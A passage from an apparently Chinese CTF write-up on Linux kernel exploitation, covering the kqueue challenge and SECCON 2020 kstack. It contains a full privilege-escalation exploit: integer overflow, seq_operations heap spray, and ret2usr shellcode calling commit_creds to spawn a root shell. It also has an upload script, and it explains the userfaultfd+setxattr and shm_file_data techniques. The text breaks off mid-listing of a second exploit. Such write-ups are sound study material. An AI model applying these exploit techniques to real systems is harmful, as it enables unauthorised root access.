queue结构体就已经是0x20大小了，如果还有queue_entry数据的话肯定就会比0x20大了，因此我们在create_kqueue函数中要确保space的值为0。要确保space的值为0，就要确保max_entries+1为0。这里就用到了整数溢出，我们传入的max_entries的值为0xffff的话，+1就可变为0。<br><img src="https://i.imgur.com/LqVxEMc.png"><br><img src="https://i.imgur.com/CxtpgIE.png"></p><p>所以本题的思路已经很明显了，首先是整数溢出，然后堆喷，堆溢出覆写seq_operations的start函数。因为没有smep，smap和kpti保护，因此可以ret2usr。<br>因为开启了kaslr保护，而我们还没有泄露内核地址，所以我们需要在用户态编写的shellcode中获得内核基址，这里主要用到了在调用start函数的时候会将start函数的下一条指令压栈，因此我们在shellcode中获得这条指令的地址，然后减去0x201179（IDA里搜seq_read），即可得到基地址。然后提权拿shell。<br><img src="https://i.imgur.com/EIhzNPr.png"></p><p>我们调试的时候断在<code>save_kqueue_entries</code>函数处堆溢出的那个语句<br><img src="https://i.imgur.com/Sya02EK.png"><br>我们可以看到memcpy函数的目标地址是0xffff88803dbbc640，我们看一下这个地址的值，发现他的下一块相邻地址就是seq_operations结构体所在的位置（通过重复的指令看出来）。<br><img src="https://i.imgur.com/4jdN5iF.png"><br>但这道题我不太理解的是我们先堆喷后save_queue，那么申请的new_queue不应该在堆喷的seq_operations结构体后面么，为什么溢出还可以覆盖到。希望有懂得大佬滴滴我给我讲一下。</p><p>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>&#123;<br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">long</span> dev_fd;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xDEADC0DE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx  = queue_idx,<br>        .entry_idx  = entry_idx,<br>        .data       = data,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xDAADEEEE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xBADDCAFE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries,<span class="hljs-type">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx      = queue_idx,<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xB105BABE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-type">size_t</span> root_rip;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">long</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span> *page;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br><br>    <span class="hljs-built_in">saveStatus</span>();<br>    root_rip = (<span class="hljs-type">size_t</span>)getRootShell;<br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;FAILED to open the dev!&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)&#123;<br>        data[i] = (<span class="hljs-type">size_t</span>) shellcode;<br>    &#125;<br><br>    <span class="hljs-built_in">createQueue</span>(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span> * <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">editQueue</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, data);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        seq_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br><br>    <span class="hljs-built_in">saveQueue</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        <span class="hljs-built_in">read</span>(seq_fd[i], data, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>发送exp的脚本</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>import base64<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:<br>    <span class="hljs-built_in">exp</span> = base64.b64encode(<span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>())<br><br><span class="hljs-keyword">p</span> = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;buildroot login: &quot;</span>)<br><span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;ctf&quot;</span>)<br><span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;Password: &quot;</span>)<br><span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;kqueue&quot;</span>)<br><span class="hljs-keyword">while</span> True:<br>    <span class="hljs-keyword">p</span>.sendline()<br>    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;$&quot;</span>)<br><br>    <span class="hljs-built_in">count</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">exp</span>), <span class="hljs-number">0</span>x200):<br>        <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + <span class="hljs-built_in">exp</span>[i:i + <span class="hljs-number">0</span>x200].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        <span class="hljs-built_in">count</span> += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">log</span>.info(<span class="hljs-string">&quot;count: &quot;</span> + str(<span class="hljs-built_in">count</span>))<br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">count</span>):<br>        <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;$&quot;</span>)<br><br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;cd /tmp/ &quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;ls&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">p</span>.recv())<br><br>    <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure><p>编译EXP的命令</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">musl-gcc <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span> -<span class="hljs-keyword">static</span> -masm=intel<br></code></pre></td></tr></table></figure><h2 id="从seccon2020的kstack学习userfaultfd-setxattr技术和shm-file-data结构体"><a href="#从seccon2020的kstack学习userfaultfd-setxattr技术和shm-file-data结构体" class="headerlink" title="从seccon2020的kstack学习userfaultfd+setxattr技术和shm_file_data结构体"></a>从seccon2020的kstack学习userfaultfd+setxattr技术和shm_file_data结构体</h2><p>本题也出现了打包文件系统后qemu启动不起来的问题，所以换了其他题的文件系统。<br>userfaultfd技术前面已经提过一次，是为分配的匿名页注册userfaultfd的handler句柄，这样在第一次访问这个页面的时候触发缺页异常然后运行我们注册的handler。（但是新版本的内核已经将userfaultfd的权限调整为root权限，所以应该用不了了，但是出现了FUSE race的方法，接下来的文章应该会讲）。<br>这里主要学习一下setxattr技术，可以参考<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#setxattr-userfaultfd-%E5%A0%86%E5%8D%A0%E4%BD%8D%E6%8A%80%E6%9C%AF">arttnba3师傅</a>的博客。<br>setxattr在内核利用中可以为我们提供几乎任意大小的内核空间对象的分配。setxattr的调用链如下</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></td></tr></table></figure><p>在 setxattr() 函数中有如下逻辑：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">long</span></span><br><span class="hljs-function"><span class="hljs-title">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = <span class="hljs-built_in">kvmalloc</span>(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    <span class="hljs-built_in">kvfree</span>(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以直接在用户态调用setxattr函数，形如<code>setxattr(&quot;/flag&quot;, &quot;7c00&quot;, uffd_buf_hack + page_size - 8, 32, 0);</code>，其中第一个参数必须是一个存在的文件路径，value为我们要复制的起始地址，size为我们指定的大小，所以有了这个函数我们可以分配任意大小的对象并向其中写入任意内容。</p><p>但是该对象在setxattr函数执行结束时会被放到freelist中，而我们不想释放它，所以我们要在copy_from_user处将其卡住，具体的方式为：</p><blockquote><p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行跨页面的拷贝，当 copy_from_user 拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</p></blockquote><p><img src="https://i.imgur.com/RXKBMCI.png"><br>图片和文字来源<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#setxattr-userfaultfd-%E5%A0%86%E5%8D%A0%E4%BD%8D%E6%8A%80%E6%9C%AF">arttnba3师傅</a></p><p>shm_file_data结构体可以参考一下<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x06-shm-file-data-%E4%B8%8E%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3">arttnba3师傅</a></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">shm_file_data</span> &#123;<br>    int id;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">ipc_namespace</span> *ns;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">file</span> *file;<br>    const <span class="hljs-keyword">struct</span> <span class="hljs-type">vm_operations_struct</span> *vm_ops;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 Linux 当中有一种 IPC 技术名为共享内存，在用户态中我们可以通过 shmget、shmat、shmctl、shmdt 这四个系统调用操纵共享内存。使用 shmget 系统调用可以获得一个共享内存对象，随后要使用 shmat 系统调用将共享内存对象映射到进程的地址空间，在该系统调用中调用了 do_shmat() 函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">long</span> <span class="hljs-title">do_shmat</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> shmid, <span class="hljs-built_in">char</span> __user *shmaddr, <span class="hljs-built_in">int</span> shmflg,</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-built_in">ulong</span> *raddr, unsigned <span class="hljs-built_in">long</span> shmlba</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">struct</span> shm_file_data *sfd;<br><br><span class="hljs-comment">//...</span><br><br>    sfd = kzalloc(<span class="hljs-keyword">sizeof</span>(*sfd), GFP_KERNEL);<br><span class="hljs-comment">//...</span><br>    file-&gt;private_data = sfd;<br></code></pre></td></tr></table></figure><p>我们可以看到这里创建了shm_file_data结构体。<br>使用 shmdt 系统调用用以断开与共享内存对象的连接，最终会调用shm_release函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">static <span class="hljs-built_in">int</span> shm<span class="hljs-constructor">_release(<span class="hljs-params">struct</span> <span class="hljs-params">inode</span> <span class="hljs-operator">*</span><span class="hljs-params">ino</span>, <span class="hljs-params">struct</span> <span class="hljs-params">file</span> <span class="hljs-operator">*</span><span class="hljs-params">file</span>)</span><br>&#123;<br>    <span class="hljs-keyword">struct</span> shm_file_data *sfd = shm<span class="hljs-constructor">_file_data(<span class="hljs-params">file</span>)</span>;<br><br>    put<span class="hljs-constructor">_ipc_ns(<span class="hljs-params">sfd</span>-&gt;<span class="hljs-params">ns</span>)</span>;<br>    fput(sfd-&gt;file);<br>    shm<span class="hljs-constructor">_file_data(<span class="hljs-params">file</span>)</span> = NULL;<br>    kfree(sfd);<br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从而将申请的shm_file_data结构体释放掉</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>我们直接来看题目源码，源码实现了PUSH和POP功能，并且没有加锁，所以就存在竞争问题。<br>我们利用的方式主要分三步(1)泄露内核基址：shm_file_data（2）构造double_free（3）userfaultfd + setxattr 劫持 seq_operations 控制内核执行流</p><p><strong>第一步</strong>：<br>首先要泄露内核基址，题目源码中sizeof(Element)的大小为0x20，这里我们选择shm_file_data结构体也是0x20大小。<br>我们首先申请shm_file_data结构体，然后再释放。然后再调用PUSH申请一个sizeof(Element)0x20大小的对象，此时这个对象指向的位置就是shm_file_data结构体的位置。此时在PUSH的过程中会卡在copy_from_user的位置然后去执行我们注册的handler句柄，而在我们注册的handler句柄中我们可以POP，因为此时head指向的是shm_file_data结构体，<code>tmp-&gt;value</code>即是shm_file_data的ns域，泄露它即泄露了内核基址。</p><p><strong>第二步</strong>：<br>构造double free，主要是为了修改seq_operations的start函数指针。这里double free的是我们申请的<code>kmalloc(sizeof(Element), GFP_KERNEL);</code>。 pop 时通过 copy_to_user 触发 userfaultfd，在 userfaultfd 线程中再 pop 一次即可</p><p><strong>第三步</strong>：<br>有了第二步构造的double free，我们可以先分配一个seq_operations结构体，然后再setxattr一个0x20大小的对象，此时这两个对象指向的是同一个空间。然后我们先申请两个页面，在第一个页面的末尾填入我们的gadget，此时我们在setxattr函数的内部往我们申请的0x20大小的结构体进行copy的时候出现了异常，只copy了8个字节将seq_operations的start函数指针覆盖掉了，然后调用我们注册的handler句柄，调用read函数执行gadget，这里的gadget是add rsp， val的形式，具体怎么确定val可以看前面的文章，可以在gadget上下断点，然后看和pt_regs中的ROP链的差值。说一下这里为什么不用填入用户态保存的rip，rflags，cs之类的寄存器，原因是<code>swapgs_restore_regs_and_return_to_usermode;</code>函数中有几个push语句，又把这些值push进来了，所以题解中构造的这种ROP也可以成功返回用户态。</p><p>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 